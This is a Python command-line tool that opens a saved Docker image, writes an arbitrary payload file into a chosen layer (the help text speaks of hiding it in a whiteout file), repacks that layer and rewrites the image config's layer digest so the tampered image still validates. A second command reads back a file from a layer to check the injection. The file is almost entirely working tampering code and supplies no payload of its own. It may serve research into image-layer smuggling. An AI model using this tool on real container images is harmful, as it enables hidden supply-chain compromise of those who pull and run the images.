import json
import os
import logging
import logging.config
import tarfile
import shutil
import contextlib
import hashlib
import copy

from typing import Dict, Any

import click


def parse_manifest(dir: str) -> Dict[str, Any]:
    manifest_path = os.path.join(dir, "manifest.json")
    
    logging.debug(f"manifest path={manifest_path}")
    
    with open(manifest_path, 'r') as f:
        return json.load(f)[0]


def parse_config(dir: str, manifest: Dict[str, Any]) -> Dict[str, Any]:
    config_name = manifest["Config"]
    config_path = os.path.join(dir, config_name)

    logging.debug(f"config path={config_path}")
    
    with open(config_path, 'r') as f:
        return json.load(f)


def layer_tar_path(dir: str, manifest: Dict[str, Any], layer: int) -> str:
    layer_name = manifest["Layers"][layer]
    layer_path = os.path.join(dir, layer_name)

    logging.debug(f"layer {layer} path={layer_path}")

    return layer_path


def rm_if_exists(path: str):
    if os.path.exists(path):
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)


def extract_layer_tar(layer_tar: str, to: str):
    logging.debug(f"extracting layer tar={layer_tar} to={to}")
    rm_if_exists(to)
    os.mkdir(to)
    with tarfile.open(layer_tar) as tar:
        tar.extractall(path=to)


def inject_payload(to: str, payload: str):
    logging.debug(f"injecting payload to={to}")
    with open(to, "w") as f:
        f.write(payload)


@contextlib.contextmanager
def cd(path):
   old_path = os.getcwd()
   os.chdir(path)
   try:
       yield
   finally:
       os.chdir(old_path)


def create_layer_tar(layer_tar: str, source: str):
    logging.debug(f"creating layer tar of={source} to={layer_tar}")
    rm_if_exists(layer_tar)
    with tarfile.open(layer_tar, "w") as tar:
        with cd(source):
            tar.add(".")


def calculate_file_hash(path: str) -> str:
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(4096),b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()


def write_new_config_layer_digest(dir: str, manifest: Dict[str, Any], config: Dict[str, Any], layer: int, layer_path: str):
    new_config = copy.deepcopy(config)
    new_hash = calculate_file_hash(layer_path)
    new_config["rootfs"]["diff_ids"][layer] = f"sha256:{new_hash}"

    config_name = manifest["Config"]
    config_path = os.path.join(dir, config_name)

    logging.debug(f"updating config layer={layer} with new hash={new_hash}")

    with open(config_path, "w") as f:
        json.dump(new_config, f)


@click.group()
def cli():
    pass

@cli.command()
@click.option("--dir", required=True, help="directory with the untar'd container image (from a docker save command)")
@click.option("--payload", required=True, help="the payload to inject into a whiteout file")
@click.option("--layer", required=True, type=int, help="layer index where to inject the payload (where 0 is the base image)")
@click.option("--path", required=True, help="the path within the layer to inject the payload contents")
def attach_payload(dir: str, payload: str, layer: int, path: str):
    manifest = parse_manifest(dir)
    config = parse_config(dir, manifest)
    layer_path = layer_tar_path(dir, manifest, layer)

    new_layer_path = f"{dir}-modified-layer"
    if os.path.exists(new_layer_path):
        shutil.rmtree(new_layer_path)
    
    extract_layer_tar(layer_path, new_layer_path)

    with open(payload, "r") as f:
        if path.startswith("/"):
            # force a relative path
            path = path[1:]
        payload_path = os.path.join(new_layer_path, path)

        inject_payload(payload_path, f.read())

    create_layer_tar(layer_path, new_layer_path)

    write_new_config_layer_digest(dir, manifest, config, layer, layer_path)


@cli.command()
@click.option("--dir", required=True, help="directory with the untar'd container image (from a docker save command)")
@click.option("--layer", required=True, type=int, help="layer index to read from (where 0 is the base image)")
@click.option("--path", required=True, help="the path within the layer to read the contents of")
def get_layer_path_contents(dir: str, layer: int, path: str):
    manifest = parse_manifest(dir)
    config = parse_config(dir, manifest)
    layer_path = layer_tar_path(dir, manifest, layer)

    new_layer_path = f"{dir}-verify-layer"
    if os.path.exists(new_layer_path):
        shutil.rmtree(new_layer_path)
    
    extract_layer_tar(layer_path, new_layer_path)

    if path.startswith("/"):
        # force a relative path
        path = path[1:]
    payload_path = os.path.join(new_layer_path, path)

    with open(payload_path, "r") as f:
        contents = f.read()

    print(contents)


if __name__ == "__main__":
    log_level = "DEBUG"
    logging.config.dictConfig(
        {
            "version": 1,
            "formatters": {
                "standard": {
                    # [%(module)s.%(funcName)s]
                    "format": "%(asctime)s [%(levelname)s] %(message)s",
                    "datefmt": "",
                },
            },
            "handlers": {
                "default": {
                    "level": log_level,
                    "formatter": "standard",
                    "class": "logging.StreamHandler",
                    # "stream": "ext://sys.stdout",  # (default is stderr)
                },
            },
            "loggers": {
                "": {  # root logger
                    "handlers": ["default"],
                    "level": log_level,
                },
            },
        }
    )

    cli()